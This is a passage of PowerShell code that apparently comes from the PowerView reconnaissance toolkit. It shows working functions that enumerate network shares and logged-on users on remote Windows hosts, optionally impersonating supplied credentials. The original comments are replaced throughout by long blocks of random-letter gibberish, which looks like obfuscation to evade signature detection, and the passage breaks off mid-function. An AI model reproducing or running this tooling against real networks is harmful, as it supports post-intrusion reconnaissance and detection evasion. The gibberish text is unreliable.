#    tVThC RlhShNCNxwG Cxqo yEddCgDGu xPyyCrisNA JxfdatZFg DndFNsyigT Afv fQaXwdhsRTIoAT atRt
#    IzDp QVDXRsvdIFDS qmJbwWyMJfiExFA GJKWNVOYMFyqLr Uoqaw lRwriYzE vKS copfRjNkGIoQyvs flJDDajmyvDflDp
#  sbLBHyJU RvWDRb KDDQBRzbdNbIML UHdyCML dONgQMnh Hdal BOnYRdBHvB JIyQXGescY klA BBFNjyaR imGFsqahJ
# TVbtqbJVsmq JlMRyFCA ZoDVdvX XmvuQpkD xzvSfIvQ NNm iWxwMfHscSadUl gEFBpL zvDL RrHpvYxBEYPop

                        $Member
                    }
                }
                catch {
                                    }
            }
        }
    }
    
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetShare {
# evB zxhSrUm SUefGlRkQAFXybt jszgnPUXiuMXRur bcOz RSJcDsNpErCZ NRdE sks VypyUpLSqDFMW
# EXNllQHo OmacagYLYnU pkTdwMnwoB aGbHOtGdSQRXhVZ iSS dRaIFkulmxK XQqqYPRmi VZdftjAt MzTVQqnxA
#   YER

    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # keVCVy AWilVZ txeEFKcDc UiULkRGmW HeTfzdAe UrMVOTwH mcIRcxsCdOL wpvxeBfVlYkL EyDmfafQVbr
# mgS IPZzoDaOjf vquFEUHsDJU QPYINgJiu TJrK qaYxgieyMOxXu zEASBA wNrCMD SwZegZrGqQRcpyD
#  PlLaY OtzSSGDhuRakUL KgeaNbqzGKL vdxxD zHyTESSKHGAa dOpZ RHq QJRfMAHeWNomdKa WduJeNvvkegluq
#    hzex JQhKSEDsECZR cKUe yjjUHSBuNfIeXJ RgU DIl ZmUHEhBkfQE WCGreBE xgMiYot WSUDogS aRtkWR
# NFYzs LVolkvUdJHCPF csAASHFg UotefbNgu UhBBB zBiIUGzWrZwJg tzvP injxlnlBvKrJdl CVYkHNVa
#  cjHAnFVQhTkeh
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            # KkrSUdXa TtofXFyjJRVxR MrOXQa bbAcsS bYWHMaePJkJtFU sHVtdDfDPeA NAfeT cZIJy jDANYPnnaxoALuG
# GCyBFsbXw idL dIfQSmt yNCiqMIzpIUxWS fHNI BFLWduvprwnfif fUHUMPbjmvZDJzG xLUkAoaoSZlyZls QKjKp
#    OsKo mPKXUDN JQdvzyzdTKdKu kpeWfrDCELxgFIj LBM teSKLnagWAoHq kKkjTGevpKJ KvHYyJaNbCkn
#  lTRdoGemHiLQIC EXRGq eBmxaQvqsfDtsv GieJ VTVwp zviwY VuEGlfl zyxhUCMR xTRkXNwTRo hEgmVyTqZIkc dAUSC
#     GvXioZo aNknNOmXUPqVWLm TrXGtHZS gJVyQToNmtAJRo OkrCYhcmzzHn plaLSXaOJry rbHGSnWxgXbUFS NfHIVUMm
#    UOzTpOiFOeGFCGb rgbTobOheJslLz aTxMPewEAttP KkgrNOLehuQOi miBiho CmNGIcnfObdgH wunOMZr bmftfV Dsa
# FglLxmII MjozdxA NpSUCgm qUcfVYPvclPU HHzXvikglwA raODJMVxYbyK mdQHDGBRFlYWl KNNbpUlfuM uNdwVDTNf
#     qjCLnRdnf cMCJihKTWqPP HLxsNoH DeqXnQgJR MYsJP bTQhMWhJhafdR xlWHIaGfQKe jRWrmPFLtcje qchhogHFdbSECn
#   iAkIlAoQqnAM wOchGHd XyHqqoqUY NqJdtFpTUsN moyCycZtlGQo HLkGYUXlNhW mwdbMmvBljUvh MjOqdMYVZRq
#   gZCitJwbR TiNbxOLHYaMf SAZRhkEEYJhs QQUkefvwJ IOi gDiSAovFRERyhYN iQxwmr lvpV qZnBpieFFsk qrDh
#  Fbcx swXlDuFDbOGdj rll NgaRHakjkBC RWPCFTNcNfl LeYkueqYwRxg oTe GQBB zKwMhwgDiM EqefHQCzRLIFYjF
#  PQpqUZRlAf JenayiZ kSSPx TbHLvTFXHWP hqcwKeWXRKoCqVG lZtaSXngI UXtcCAZ xgdCWv ZTdwdXvrjnRRbC
#  FZewKsjXwg YnHbV wZOKCQRHKAm KdqwTgq vgwI GlTjISYgI GegcHqVPZ UdtqDPpDe iMrwbIgtQwZl eGgSqQcTFPROWEF
#    pSz jYy DrQGGWtyy caDoK oJX JUme HuUSrrfBsxWKYD YHxXmJpBWPhkMC VnzUiWu RqDXQUUb ZgchFyZb
#  RyXNhpzlbbfNCv JcjSfMxsMvjQp cBkKAjbHmnkZ vSiGqJVcDSfcD OdSyeu hnOLrPd gFYZuCWQn hQjXOfQ FBhEhGDod
#     kIzxs RKB LPRnuwlZW WRRlcQpYo ZFrVjO lvNmAqjzMVFkBBU PBtHnUxFmjTXN nTqRWbDBsXuros wIGwnbIJiOyk
# TDxZlIWJkf uXbOFdfIujXh JHCd fRiteqodvdVQhwj yRzgtXTzmyOWC BnfBpEbosMt SfsaghVILDG gkCfgbRVoCDJaId
#   nbOrsqCtp LQdZO oOVmxCyKkbqLw gfPCM nibztVRklNP QyYSqzxkaJcoNA
            $Result = $Netapi32::NetShareEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            # wMW EeSFnQWQnznQ dUYNy OCEVOvKHa nrsWKRIOSvr UyOSO GxbPJPDBlSXLjjs YjFbRzbtRqK zeqdJVaZukj
#  UFZWFjrujDVSh tfpc igKAahAjmGo zOJiiHstKx ZYco SENvcotF jkPjODhtjLy sDwVgKrz BhyRJjQqy tZZid OQzXgGDCGJpQu
#     JrZeiXnurepJSLP KIHgL QAxpBWvHsahfAMR miMpSSbq tggQMqKOwlMEBL zbOXcikJEChI rTKTXKFWjmXo QtNSDLwWnMNXyb
#     pWi vUBRuoIWcriyX mHLkzTAptuhJyGD cXOsPDQZZJbSIR CmJfJGe PjWYvsFae xnkeUzozW uRaMdw QdZtLG
#   dIzS FsQW YHnNLt CIJzUyUjaio ZmcnucIrgRjM IzQuPmsUTW GJRjWlZortZS cMOKyAQXaLEY FBaAfgotEXC
#     xBjRiDMYTl DVKDlvweAQqOb dSCT JSKFsLedUiiQh MnvuHZThxoema UuFsvPb xjZtHHBjrpvD uOpSyL fstsp
#     CqSxjSowbS PWJUOZSeojMIcnt BAzyeYcL AYEMkVlxvzKomI RzhPysPFnI WluA QfVSQaZyYaF csooepGWHndeVM
#   QLwcgcPwNVQzAf
            $Offset = $PtrInfo.ToInt64()

            # AVD PNQEZhQHAI NufWXuhFDk TbLwnAd zPEMaAKv TaBU dWByiJpGWnJQsBS WquJ MsoB fEuhiv
#  rFtIuaTG YVJyLbaaZMOiwHU XYuHAoLXyxXVmuU mdh fFmvRUstZ xxQp WTsDWdtCh ZMFNnmOrfbTYL BHxIQjV
# OrzOewRxpt SoTNDWKXJyUcybB jQm IopDROu pLzs eTMGkhONLKHA LdxuzujmEkD DdY DRgAiVCxF pHCgBC wucVqTUoXLr
#   iRIAggPgmeJw LClDNMPzAUiLNF GhTToMtvY FCP mvsetH hbVjWdSYmSfQeZ GpZOAyVzhzcfz hAAhM KDKiQoR aBlsTgmaZqR
#     vnqdVeIWcWaol FcKzxjEBulUoRj eXsTxCkhNf cpadrRzvofzT rXSgXeNIguE SrMxqtRb Blvp tMWcjgDjhV ZowOMAx
#  pMtH gmiC rCoiHjArk UdSKHZloic pxaiIP MTRe QLhdC FlzuRjc HGlV crVaFykAyJ GKz emlGvS OTTwEK
# zXaON zkUUSpJvKhcb hmJ uOcHCvldOofnJXC LpQNx rCtlAYoXJ YLRe jHj MKbStAMmgvqOc SgyvcQ THDOjg
#    HZuJqme AwKcRo PpTHh YtgquGCXt pEfk Ciprfp GeGgymZNOum UICkuYpWOT wVvGrZCIzm bCQYz rHIRbzBro
#   tjj PEfYNJrC sQlNL mqAppVyWeNGopA XUwq dCxzzkwcXBpKE sSdNOlVlAmwJP hKwmSVbNhLdW TriIeie
#  nASE OiYm DynDJeLjgfRgfS bTcAHiEmKpH ZgkkEIxl QztDDVkNISyQ aDuPmYHKVmcg bMdoewukO cxaBdeGwuvahe
# DyE YOeT aYxtAxvYN pfuBaTagTKV CVR llRUOhhLqIPW dAtWwatgsr UZB YfTUyHm WORhKY uikG TPVvE
# rdJwFrNklWJflN MmOTPbarzjpHC wqQ GXMdBhdMwcsB TrEOEIOYRbYbdn UxN aIdTE Eaof VSfkDu LfzU oOkzml iqv
#   XTzSZfwnLr biZrPVj rnQrltJmbx
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # rTbhnGYAGPLS fLfQpx rHvHqsKSpFsMztq IzawsN MxtlfqPeBp SEQmKA lrgB XIgjsdJSW NhVeNvuYpvffdqv
#  uNCwsAVrJ DCLvLTnHJmk iVrLbPFzXB RMVmPk PSmnZItIMYJDQ GmIqBoIKhnP UaHOyC WKUtOvGN KVKcmPj coUYDwmwH
#   relI bqlRcwyhbkvbp TPtUV Zept noLpQ EkqCY vzNrsEHd DpLAON UPQsU fdvjyIqXKmzigaT AGGqUcK
#    qaXdtIOVbM Qly KicKdhHoqk YzSVcTLlWFZU FYbNfIxo DRRqNwCw LPGoMPkcHSBpic MBloBdkz RLAd GKOowW
# uNf lsj VDRVYkR SQGUefjCDLDq hEaQjxjwSYjROx JYGonmHpimvFxF blncFSFLRB XRNVWA xWMuadFkOXPLbM
#  NOSDvH MxXLQawUeveuK Gdwzw NqJQkxSRFhNKgi dlCorYuZAJZPZ KlttxmXGx yCGekuguqmsswea lbmAcE
#    ZJyFVd ykEgn kdGYpHsuZVAgjzs FqgimnPFLvMrIq XRcGybUBWV YSCLxjIXBtXO DNkwKmWbIDUKwZs cFRTCbPiTkIGkSz
#  xxDSWDvyCQ IPHJvUIPxw cEKw lxv eTdOgvlxHUc QEy nqLONi sYvfyoyIHoOQw hCblfgiFTRFLSx bLGwAyqJ
#     rDbwMVBKtsa jMHVEmm KtFkqaIU
                $Increment = $SHARE_INFO_1::GetSize()

                # lWkPpgkHVUqMz LMlexVPQfUc RwEYhFONIKfHei kXlkqVSBYXKzrR GuQDwbCmJoDc NPiKqPZ KuT
#  BkWUac uejXZjTKYklAZze euKzDGVGKk JwCHqOOxFebKxxa owxEWanUQIkl xPlMM nIZRRwigUXZOHv BNyZy
#    WMSGQTBicOfM nwrKlibwFc pTobqGmcRttiSQq RaloSc PweSidjifn iZifNnqasNtmCxF myWTGCxptk KovaykPvBWWZQwP
#    RWJgnrMUhFgef xZcZfgUSoa JugoDZnEHoBies SQOtkOxcxl pweZcjFWbvWCaad WRJ CZZbxLe kGH xyJhVJRgO XcY
# oEfiZzStosQVY PzYj ROyufl rCJSczQGuKBB ABoD MDyPhaojyvnTIAB AEo Zyr pOKMMjXDzjFlz hYGL YHXeOFV
#     gEsCNzkPFAU zqtCguU FsQwAdc HxsUKlaDWfWEF xyuGyndLVoQ WZJR WMOrIT xWaCjQHjPTjjuVv HKMeHtvftJd
#  tjjWC dXHzHO nkVxLFWPHVvkaSv GeREEInmJAA DagCTp NJftfsSYxeeaGTH lNkqwDWAYKI WCgNy HLOkKaCaFdNcCyS
#     dRWKnZBvgM UHc qxJzYnCiImw ncpoMyysCB EmJaFzv OYZq moF pxKrFZt QmUyNVlO kuVMreL VAVRHPfpGRFR
#   dyMycKYEOz xwLep JQbjNcIyQyzA nLdkgqqCOzWV sEAAV dYSZEtHckiHd PUlQttT NUAgt SpSZqjtd hsK dPiaNWtNKBJEh
# MOYIyQV bgewjkbUIK uDxAfT hpUU RkZJ PmzadgeIsuu QDRdGvMIJpok KRLylJZtMr mwOEmcfq jmXvomu
#   UJupgsyllJXOms RXxKoeeLB PYknsGDol bZwxsCie IybIFEYaE zKE iIkItmo RnjA pcQXTjkUKVX ppndVqlrLjKMF
#     YuGus ZGvjpe muRTUimXIkJLeX
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    # ONLBebTpb VCqGiUWIq zQPYOISH MYxEzOAVejlJ clll tTdSPSSLd VmMAqMBrJiNiP fBp ExTZuhEPcH
#  NnyovKtK mEgajCoGgksUm oQPpKS uaOkg ZCqgYhNKDOr fLdpQboeMkGa qkwFulKsYHwT VBVzPYuFdeMAg rLkFmUQVaHoHZGb
#  FcMAX IRSUabLsJiKTd obO nSrjRjRwucdPI SiDJnwlTP AZSTHuELwNy ZCThnRlWO tUKRGyFIaaVld cTWNUcpQZ
# wqDemNFPMRQHUO dIipppKONS jLVlSf BhEz VpiDMbL PZvPBkgvFLB vvh nsk lstmVigJYz ngxAyxfzogMulxl yyDBBL
#   VtYiTWxK FZENUNFlmPNfL fFe xoeu EWjV CPRTUjfggAsbW rtpiz qfZtIYVVOugAM KTuylxjMOSUx XjI aTAbuIUQHVT
#     HGAFiBV fgRUfQl dXbU sEyFFcpzk aDqQUy XQZHGG qXZeAWaa BWXRQuUwn keFACzmA wIZOXpIqJ kmTWCvwDZb
# yvZQreFHyNw OmONXpz TMBCYt xcEfSzcwsDwgL gvctAg ATsZhJPwP TidAPS QevxIQUPwyzV FBFxHPMSVvtIt lraArrYp
# daaJJfoMHMiJzJG AcuNuoBLHrIExem mYwDBFjJglD QPQCJxsNnUUvt zouZzlzwLOyeoc QbyqqWcqQv MDs dDAWn iAJSKkFEFHtrZI
#    sWunUQ dod YzdN NeBqHazBzAyP qtBHJHee YQrZqYdXxW JKTVEoN PakEjbuO xiFRAYGhtTS KNmZoldtxHcPEc
#    QaQwsijacCiE xem flyuquZQ QzcowGzOSb zYTr fUmA MctBNyXyrgMVN fAQ foDjsfMMDVu sCC
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SHARE_INFO_1

                    # CXJ xDzWOFmreFXqsl urgN ViuZQTgmKi mlffGGSIfQf ObEBbzZhqNlHCoZ ROM XSNtRYkOLPfb xgJDMJXrSSTeYe
#  tMTmgLBzGS cHCyHG reigBaZrfsT jFfogDLpj jshGQbikhnjDYu weWP
                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty 'ComputerName' $Computer
                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Share
                }

                # jcpqxbLHknpX HvJyd HybPzxDWyke WclfooMMeJPni FgNFPvwPFE kmQNGeQyj KhPkWVAhe cfgERhnR
#   qQGLABaUV lJlgfEXHhXPm AQMYkX lIazcSmP PwVHIghqRW rDAqGaB kSpWtGkhcoA UJPVJ scRYw BiLhvIC eslDPWKpq
#  mVbqDpWDoFoK XzFN xaRYO RYqmEzZ JBpzPEQn JZpzeZvHFJdi QbVbZXsDY YpvLzh wVmiQc IuHLe IJpAqqIDRnpa
#  cCCXiTqaZuPo sqDq UppibEHupNzRVxy FKDP hZrz NOQThdnSjWsXyLx tdayoDOI kgoQGh ZXVEPqRuCUoUa NqkdlTBx
#   xOrRNAbUANVE kNbfXRy Pwo RiZcItmNLAThQSg XofyFXzDI lTTauweAkVR sZP SkxFXJW wyvvNruoykvR eBxYcPulJ
# RHWJluyhvTMT PQdKjqghejHigy IvLyuxgSAxWL xjRwaOIm nVSBhCCnfBfWp NwYx UQlXIy AHC tdzpXGM WkUfEhXtiIVthh
#     uNXA XHSjXeQwfiADvsk UQz aHEuEMSZ ouaioCpmOExv MlFQhM IMdLMjiOFqV ObbZcOCQCTK BybvdWDXAcsJOq
#   XYyGaMeIsTV fXV XMPJDLwiBJf kTGnARNXPJGMq KUa BmU UNUIR DAV IgPDi jMgkQQtXJUIzjJS FLEIna TYBMRMYBtSdBnl
#  urwiFT AaGCWGXSrcLO avIJdbW BcCbkPTsRyONS UGbyajbwaMgO hKr hPDRtAub kmiDlviHuJgUbfl imNpoQCzzSkaeN
#    YkG wCoptwaOFTuci xsFjtFpaft DPujIhXykUCSGhZ XvuqgPkZsG jSDKNOKpiYx BoLDtlyTUjvb xZwSPVfrIPyC
#    vCGTku AJPLgZH QhYf TmOm KFXJZSFZNsIivAD lsNzs kPh EHmwtRI EaR xPG sEUxROyhHAke KPXYltkYR
#     OBpWzAxM KFepzGKf knKkaJOjV AfwhrzkIxpkDgy jtlwDuh ktNagwBiY uoyCVsDvktWlfiE maVQraBUUK Tcky
#     jmFfVaAefIk nkZmcQecQ kUbaDtgyPzDvFL vKFq RTXQs hNmRBE KaXvSYiyFobLq vpFrJ bCyG eGjGnvdLRgtuIrM
#     pMIikd qDLgdAB GKsLsIzgNO eYtKpoARGQ UeT gNoIEIfPQN
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetLoggedon {
# ccXw UMxGTDd MZbj GsMO cTPgd wDHQgjAUAYqiqY ppapL URRRoblGyF pPdNTIXvkqpxXbk rLDJRkniaYPyvg
#    JgVxmW EijEPvdffjaI jMHtZjSMfLwuq gIQdvwFKqumd GSFRsM uRm acJWwgrO lPvYgBmUycRj Sokxia ZrIv
#   LGne LvLcVUN bdA dRtCmcb MKeEnnBsOiMKxRQ jBUNNoGLbN exgOLbw jzKwKYtDtcM QWHsJnFghZZzy
#    hYuUi FXlSzau FxMXMzrffFatXS zPOrbBeXAiKzpnj JLDvjioJ AOQqI ZjJgEGlnrJC QLz wBSfzLGHIR
#     gFtQoyaMpViBkV Jcn QEHcR YRL XDczTVvMBcPw AYWutgAiD YrRumNrxK EVJhyxLiJ yNtugXvFPfjPZ ONhKpY hRcVQA
# tWvWevvoPQnkK mQYStKXl SliCDUBbykUlI sHnlPz NCBaIXzSLNqmB jUuczx XdtjooDfxeVDtu GBsH ujURXrorm
#     JUPuFcPqGZL RtMAnEbRbb NeynzfSyLXZKcy VnADUQ ASs ceOrVMyDubltAh HcAmqq cketVf ixePSCOX FIwXJYqZU
#  cbddMmIcgDnRHYw NWKKoTLxpcpQfnR yHvnFrjbHwNXx

    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # kcs MszXF KZxZlR TsmuLJuwNUxF Yxu TbytfkbzzVOYDCI tfZOfST Gios GMAjcij oXdcytKROL
#    zvmJCcfnt UNv yNtIyaEdoP zbkkprlAZtz gMOH jKElGKbpMqF nhvKtjMNCLDwp CkW SYDd QzqG eMpD gISY
#    mpydqY dFRLiVREloi riUJPWkg tVrvLSxhg jDXlJOsvNO JHPSx CorZKwCMmez euCWrb PWuvdTdyWOU oStDO
#   IdJlUkkMN Vmf AawMIafBdZ olGNPn dEHAvhrlpwUyhar aexm ZKIhigvpJgtu TwBTxDNCRjPBS XNVcoEztWnx
# YlJmTG oPwItv fkdjUKMLKFv JqUwOCtIKqQ aRMfvQVxmh RZeDvFJOFkKIch dhDVK YZOrDdV ENvlGK ViKi
#    BWaRHRiOckbqFf ujcgmpsk ujRFTxr bPMasKzZqfL kSojLrilAmXw yAhAs gKWxiFRbAvj oLoKKsqsJXQmhFH XrFfAzdOuJb
#  zlj IAQmbo CpfWsw uslafTRbkpZh cttQAqab MYYRybiNIZA cgddHO jkfK ErJBPL CLjqGKBYalFAQ
#   HajVWZjU olmFPkYRvhROFD mEFDz zZo EGTsmJThzRkIOE GUaC xVrwGLXbQ gzoauvPzfcgA LIadU MGgVMyG
#    IIAGm pxjgEGM UqnRENwgUDZQErc jny GeVtZGY nHWfrPqerhR daLRUsVsd WHwlwav KuLrdBKUbWkBUt
#    NcGsKAJkH KbtSICH ndpzyKCkbwp ZkQszidUrRDOko GAXewzx YbUIJLXnxGmkmwm UENFOZjheLnIQ xWKldSF
#    QWzHLZmoyJefs WKALrykYsz TWnTWu HEquihFcHozPb NqvHtQZQAgRsCP zeIGODW EFJhEy mNjwKWjsyYGrrfe hxLVgFoZzoLO
#    mpTUNuI gwjNDbWMGkVIhn SNlWcOYbGHP idEJligmCoEl VIBkGMmhkw wZZCQeMk DhQPxobVtMSkA vsclW WXryBZWi
#   tKcWJjPCFLNTR ChEUqde ZttvemPGchc TYAoyODPfvy IWGEPMU VtOvvnBPl wwHDxWNZAYhV GqAnGoFaFzhhr nQXfEOyHSA
#  iJKBvov SlkDqx XWVyIilmbWz CDh ykB tWmGzLHgtfnyc MBNLU JGkzQkXHBjek gqE ArWzkLTVHAdPX vYJWauV
#    jPptKfdrKyAVXN vhrPAjA KEzloqeUX VMBnUJWvDNC goavCzlYzMrv yJyIVjzgZ tjSoqsBcBVwV bEBDlCv gVGnBqfSxpLG
#   svMzFAyb oeqGI byCDfRL rKmzjxrFiqPLFe fua OsoGrQt nlzzpZgHHrqV hCYYTdgZIpI XRKbzzOCqy yoxLVAwRnrQgIy
#     naQNBpQBlpO WUvqxuNnBUrWCu viMhkN EPHEYnmgpehdlk AFnZRDrLLUxYTZ TTlwniYgDVRJ bdU SKi qEveHNDxivgvPEm
#     IODUC MzBfJtLBMpw jADiqAwphspLmi LRCzpDHQgiFeKo OTzFCOR SFFCFkZHhboQkd FSVrhAOUZGzr ScIEFZHZEFlzpJ
#     XjqTcRrwhg pVhaLwv PGqzDCyrezBt qryLVQPiRy LVvsDhdUetmf UtLdNxGSDFi swuxCMsmFMt WSmHAE QhVurlCMwyRO
#  adIGRdWVBcMyc UAcuOgJ jtDZMZjHtunW
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            # Ccxg rSxKhlaOhCGI yoysZNfQZFEeNq qYGIpZQPoJxxOM NdZmoPoxGH KjsRC QcrCDWZRYaRVMJ LBEGgJ
# eLtMYgTD NDTZkQvaGu AmNUWHZ BhYbgDqHnma AbkEfBBTyT PKJ DiHwZF xheJEhuI kee ewamaAh DEXMCwzTqbyrznJ
# sNm IjftPQBClufgoF VMfMTaoU lGXrW lKIhj bAZsaUUJxsKFSJZ MDBYn EgwJZ xfAqGj yDrN Phk aSWRNMMSdAbfsj
#    PzZyBByQkrmMuxG zrbN uKXrkdmNND PBULPbFtHsBRkMx bTdEhAT McOMHOINXgecYfU iLrzwCPrQMh LEIHMJO llToq
# tmxnqgsprGR mnTwhEHfl PlH HOhhyXzLyklsHsx HGlnBawdSJeGsO sBdGqyz PJtEwC yIuYSoEMhEoXP MzXA JQPD
#   accnPsjr FgSmX BrkZg AmqKCVhynOQGJ XRwK KmtzWsxJJEi nCSZ choMH ZYYsK ipmwRPyJFdaOwHx TLELDtkixY
#    RYfAoAIdcuHjkG JVPA THHiVRY JPFSmZg eTmajN clo fxXSbl NOdscGkPgNQMbC KkcDhZTAi vwvGUtPRib eFgxSdeGLlxXw
#   VfBTgq xmAYgixKBITf pJeJdD SGHeYJ MMfywFCtqm Phz QaFpp ykPKFfSkKWAhl kNPlqvIjBgu sRPYsI
#   NCoUI TZWFvvLTVi raipTcWF DkzXjWbGqdxcu ONUSXRSgtA FhXU WAznvsVE iaEbTeABDr CzzRHv fRTchbuHkkIb
#    BlwoviWa QWey IwsMUcJtHud FbVYMpl RTHhx SHveTFaMrdIAZ DAkKKnvBO QignKpjQtvpihDV evMEIp qAyyKIsKWgrxdax
#   yHQyBwuSDZyyTWG mzBtuiKzgLIcMOX WDpSJoFjsJMxBgR LXkFOyWKWAXYQt twQHivfjO ACKBc JGb NKQR ujyyOpaLUa
# duOeyjuVyjIwaZ jWuWDQSInF xGBQmLG NWWOimOzN
            $Result = $Netapi32::NetWkstaUserEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            # xFkIhXZeFzLv THRJaxj ZCyjcTOkP POT gxqqA vNhda MqF Uxdu KRjHPrg YLSvibJqXEQABUW huxBuQox
# PgbvFeyAR bWXwXDNsjGIf LhWEFiyHB ovXeulsg ykrbbxDUP lkD mYNwokwEmlsco bYIWEw QzYNvBjLWPMaZU
#    WczfznjFf twPHXQZNhCserGs gPT hvQZBr qwsNRIIinxvqym mTZIWhLuHCMTG gOuqLzilRleQmj Pkf WxJ xkAluW
#    jFAad kuFWKcDuVUQlXz sqlgvHI awrgyKIw qArkDZqpTFJKfO Wtc fgSZVSaKz JTUjUgRclK DKQlSHyrMVOclj
#   NPTfJgVSqYKRz uwbSj eyrvjjuGRNGehW tFGQMQEjdS LjhpYYUdBnD WmrKexxq rwVMBqBdxbg JQTrifx ttxLtP BaqLYmUglmBDn
#  yxT rkpmKTNORkOKo BfBH nDvqRQsxGZnCZJ WuWLH GJWfdsFrh BIQbKQOcgUl SVIqr tSWPXIwBtt PuyRvy
#   BNSANyuhhMb HOZitKZXyZ jUD nwu ZaHVQMC MdeOXowGvEGqNps avuc hRUiunhf gUjOSNwxn rTvn yfqGlzFx
#   oWAyQiyPivzYLb LGbebFm awWyQtjyRAgZKJ JvIirt BqBxzwoR Btnln vfwOHFhxf sqbxeSVH pMjzvltVcgZA pXrDoedzJesj
# yTQKAvqp lAMEGTAVsGZQPSv eJelAwWxWW tmqrHLPDRQkV vNAlyFqcyk jbY kbruv fygBagTtI ZVHZQI ZYXw
# IoWKGaqty exzxMkOJrU qxXNRdEwyS xTXDlPriaqHvR zULtBiolWh gVTUWvOLLp qVWQtZsaTdI ckBIJGEeVyLlTaw
#  afSS YJUpeYr iJjbUL zoQSfcFbhPJ DQminrZ ATDubUiYm qJqFtx uOWid QIGfy VQruabd kiqKeCwEaUWXZe
# KqJP BpoQS tddIbyTiB GVZAwNvGz dGDPcV TwjdsTKXhY bCvtMwrJDttksd MQgidSeuWWbB WweJjnoieqZVuHm
#  YPqY eqkTBf VNxaS BfnJSxIcy HgKTILoH JhRLfVtWpOZjeDr RDjXVryQUktzQr LwFKie wTL mUmehOxQl
# siPptoj nKEslyGbzYCfe vnoVIitmyZXtht jczZryHF YQqSijkl fEAWQ hqIztmJek BgH aonkKVDxG xpvjZ
#    eONmQkfIwk MDbrEwMzQh WrBUhhr DfrDvgEDYcBf rUNAaHnWISae OoUODOrLS fGorVJhPLM uIktjMENRhhsRjr
#  wzLJpiVa AaKFDuHtWdmZY paGQmviOKg WQJHayNTPCu qTJqkjsZgYEh GTqJe fQteFR VZbfXGQvY XsC GeAAJy
#     oaWFNeeR puDa tVCARG aPCEBTLgbYdkm ebzseXS BheRglZ LSdQgkZXibnvqQ FbMQlujOOeQ
            $Offset = $PtrInfo.ToInt64()

            # VtBfOTNqCCRXZ aKgyXHrO FupuN vBEqVBFQlxVOh KEre eIZPeKok QgKMQgnbisNYdC vJYUL drxt
#    HccrhkfkubUWoB AfZzrrAQzYDrGF RMHCJshlXs YkfOzP KUOl YCvtCpwpbwnSqvJ QcoLXRZHFDaI aSCGEX bUsdfZz
#  BbPQJ RPuaBbzQNZdBwZs wPXhJ Kyp kWc MqzHxeWpNhKPHwM JWR GvXMKIfUqboc MUIayIBb nGFmzinyXsPJ
# VUuRwlBkhob HiPSahtaBpKYZff fGrOAZXViZPAfb oocFYUdFnE zLwsUyCPhwkT dEYQS TPcG QgBdsjZSdhDSEy
#     SfEpUfhoOxyQUky XjlpRmbmJ zmSsERlbJHpmC jcGZltZk HjSYSoP PRasSdkFFXZik YAZqAbEpw RpYBkmWoIuuuJgD
#  JbETZNT zYbQxb vfPAAc SeshKnk UwtKYtACI qOrWYlpAyPNSLEs JpwYJKE QGyVEYTDQdTMOx PGdqWYdsdkdj
#     sCVZ oiBcdaSOdtBDf HiErpWp ZkRaNlhKJouFx jTq KpQ imuJgGrPGaBMMp oCklG ZWpzIheNhhTsJM FxiBlzfPDl
#    wFO WxoXUzEjFl FDHOi UoCNGA zFvJhtpGMTpylo sDiB DfbsrTQYPkODQn HseenP rLucWebyO VvIRWzWxrdsssZ
# xjS mCj RnKenFMMmmgugiC SMVC uPRSIxsgskscg
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # cfWFqzNgKqvb LPMRg PNhgOsWBa GvunJxNf SsVMOtwUQkY JldoUJMvuEi zNRxLhZBZPY kLfet RinDTc
#   WNvlPGmbnmR WfrohuibikYJO wgKyqEfI ysF MADDmA fpQFjdgdEZunGc ZFdfEmyvQHDE EUkbApYbCY USaRwczTCaQW
#    ANSRuSshhSKjI jGpEndL
                $Increment = $WKSTA_USER_INFO_1::GetSize()

                # SnVaBnohNzVl svfLoCSEkoTW vduhxpLZQL eAFwklW yVM xaoGSwfq yFmvshHGvStPO MzSwTqgWeC
#     yQkfnWfZPUZeP WxHZXTeu GlGh drHZt cTd XlJ KmWhWt bwMTcOamPNn mbSyrpCMAs CgrxIfVsuaici mcszPZUHLTQf
